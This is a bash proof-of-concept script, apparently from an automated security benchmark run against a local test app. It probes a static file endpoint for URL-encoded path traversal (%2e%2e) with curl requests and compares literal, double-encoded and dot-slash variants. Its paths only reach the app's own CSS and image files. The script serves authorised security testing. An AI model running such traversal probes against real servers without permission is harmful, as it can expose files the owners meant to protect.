#!/bin/bash
# POC: Demonstrates URL-encoded path traversal bypass (%2e%2e) in static file serving endpoint
# Target: ./repo
# Created: 2025-11-06T21:44:50.170Z
# Session: benchmark-XBEN-065-24-mhny77r3

# URL-Encoded Path Traversal Bypass POC (%2e%2e)
# This script tests whether the static file serving endpoint is vulnerable to
# URL-encoded path traversal sequences (%2e%2e = ..)

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-5001}"
BASE_URL="http://${TARGET_HOST}:${TARGET_PORT}"

echo "========================================"
echo "URL-Encoded Path Traversal Bypass POC"
echo "========================================"
echo "Target: $BASE_URL"
echo ""

# Test 1: Direct access to static directory (should be 404)
echo "[Test 1] Direct access to /static/ (baseline)"
RESPONSE=$(curl -s -w "\n%{http_code}" "$BASE_URL/static/")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)
echo "HTTP Status: $HTTP_CODE"
echo ""

# Test 2: URL-encoded traversal to access CSS file
echo "[Test 2] URL-encoded traversal: /static/%2e%2e/static/css/style.css"
RESPONSE=$(curl -s -w "\n%{http_code}" "$BASE_URL/static/%2e%2e/static/css/style.css")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)
BODY_SIZE=$(echo "$BODY" | wc -c)
echo "HTTP Status: $HTTP_CODE"
echo "Content Size: $BODY_SIZE bytes"
if [ "$HTTP_CODE" = "200" ]; then
    echo "✓ VULNERABILITY CONFIRMED: CSS file retrieved via URL-encoded traversal"
    echo "Content Preview (first 200 chars):"
    echo "$BODY" | head -c 200
    echo "..."
else
    echo "✗ Request failed"
fi
echo ""

# Test 3: URL-encoded traversal to access image file
echo "[Test 3] URL-encoded traversal: /static/%2e%2e/static/img/logo5_white.png"
RESPONSE=$(curl -s -w "\n%{http_code}" "$BASE_URL/static/%2e%2e/static/img/logo5_white.png")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)
BODY_SIZE=$(echo "$BODY" | wc -c)
echo "HTTP Status: $HTTP_CODE"
echo "Content Size: $BODY_SIZE bytes"
if [ "$HTTP_CODE" = "200" ]; then
    echo "✓ VULNERABILITY CONFIRMED: Image file retrieved via URL-encoded traversal"
else
    echo "✗ Request failed"
fi
echo ""

# Test 4: Literal traversal (for comparison)
echo "[Test 4] Literal traversal (for comparison): /static/../static/css/style.css"
RESPONSE=$(curl -s -w "\n%{http_code}" "$BASE_URL/static/../static/css/style.css")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)
echo "HTTP Status: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "✓ Literal traversal also works"
else
    echo "✗ Literal traversal blocked"
fi
echo ""

# Test 5: Double-encoded traversal (should fail)
echo "[Test 5] Double-encoded traversal: /static/%252e%252e/static/css/style.css"
RESPONSE=$(curl -s -w "\n%{http_code}" "$BASE_URL/static/%252e%252e/static/css/style.css")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
echo "HTTP Status: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "⚠ Double-encoded traversal works (additional bypass)"
else
    echo "✓ Double-encoded traversal blocked (expected)"
fi
echo ""

# Test 6: Dot-slash traversal (should fail)
echo "[Test 6] Dot-slash traversal: /static/./static/css/style.css"
RESPONSE=$(curl -s -w "\n%{http_code}" "$BASE_URL/static/./static/css/style.css")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
echo "HTTP Status: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "⚠ Dot-slash traversal works (additional bypass)"
else
    echo "✓ Dot-slash traversal blocked (expected)"
fi
echo ""

echo "========================================"
echo "POC Complete"
echo "========================================"